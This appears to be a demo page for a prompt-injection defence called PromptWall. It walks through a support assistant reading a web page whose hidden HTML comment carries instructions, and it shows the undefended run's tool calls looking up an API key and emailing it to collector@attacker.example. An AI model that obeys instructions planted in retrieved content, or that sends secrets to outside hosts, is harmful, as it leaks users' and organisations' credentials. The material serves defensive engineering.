PromptWall demo

This page describes what python demo/vulnerable_app/app.py prints. The demo is a terminal program — it needs no server, no API key and no network. Full detail in WALKTHROUGH.md.

The setup

A support assistant with web_fetch, read_document, lookup (internal records, including an API key) and send_email. A user asks for a summary of a page. The page has instructions hidden in an HTML comment, addressed to the assistant rather than to the reader.

Same input, two outcomes

Without PromptWall

[EXECUTED] web_fetch(url=.../article)
[EXECUTED] lookup(key=api_key)
[EXECUTED] send_email(
    to=collector@attacker.example,
    body=...)

outcome: DATA EXFILTRATED

The user sees an ordinary summary. Nothing looks wrong. Every step used a tool the assistant was legitimately given.

With PromptWall

[EXECUTED] web_fetch(url=.../article)

stopped at the input phase:
  rule tool.invoke_directive (critical)
  in tool:web_fetch
risk score: 1.000

outcome: no data left the system

The fetch still runs. Retrieving a page is not the dangerous part.

Why it stops

Three things had to fail for the undefended run to leak, and each is broken independently: the fetched page is labelled untrusted, so instructions inside it carry no authority whatever they claim; the injected block matches a signature and scores high as instruction-like text; and the tool gate refuses send_email outright because its authority traces back to retrieved content.

The third is the one that matters. Detection is probabilistic and an attacker gets unlimited attempts at it. The tool gate is deterministic and does not care how clever the phrasing was.

A clean request is untouched

risk score: 0.070
outcome: no data left the system
reply: Here is a summary of the document you asked about.

A defence that only ever says no is easy and useless. The demo fails its own run if a clean request is ever cut.
